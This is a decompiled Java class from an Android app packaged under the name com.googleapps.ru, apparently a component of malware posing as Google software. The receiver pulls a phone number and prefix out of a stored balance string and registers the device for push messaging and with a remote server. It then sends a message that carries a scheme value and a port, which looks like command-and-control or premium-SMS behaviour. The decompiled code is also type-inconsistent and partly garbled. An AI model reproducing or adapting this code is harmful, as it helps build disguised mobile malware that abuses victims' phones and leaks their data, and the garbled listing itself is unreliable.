package com.googleapps.ru;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.res.Resources;
import android.util.Pair;
import com.google.android.gcm.GCMRegistrar;
import java.io.IOException;

public class ProcedureSender
  extends BroadcastReceiver
{
  public static final String ACTION = "com.googleapps.ru.SendProcedure";
  public static final String BALANCE_STRING = "BALANCE_STRING";
  
  public ProcedureSender() {}
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    String str;
    if (paramIntent.getAction().equals("com.googleapps.ru.SendProcedure"))
    {
      str = DeviceRegistrar.getNumberAndPrefix(paramContext, paramContext.getSharedPreferences("PREFERENCES", 0).getString("BALANCE_STRING", "BALANCE WAS NOT RECEIVED"));
      registerToGCM(paramContext);
      if (str != null)
      {
        int i = str.indexOf('+');
        if (i != -1)
        {
          paramIntent = str.substring(0, i);
          str = str.substring(i + 1);
        }
      }
    }
    try
    {
      paramContext = TextUtils.getScheme(paramContext.getResources().openRawResource(2131034112));
      ProcedureStarter.sendMessage(str, paramIntent + "+" + (String)paramContext.second + "+" + Activator.PORT);
      return;
    }
    catch (IOException paramContext) {}
  }
  
  void registerToGCM(Context paramContext)
  {
    GCMRegistrar.checkDevice(paramContext);
    GCMRegistrar.checkManifest(paramContext);
    String str = GCMRegistrar.getRegistrationId(paramContext);
    if ((str.equals("")) || (str == null))
    {
      GCMRegistrar.register(paramContext, new String[] { "360470374643" });
      return;
    }
    DeviceRegistrar.registerToServer(paramContext, str);
  }
}
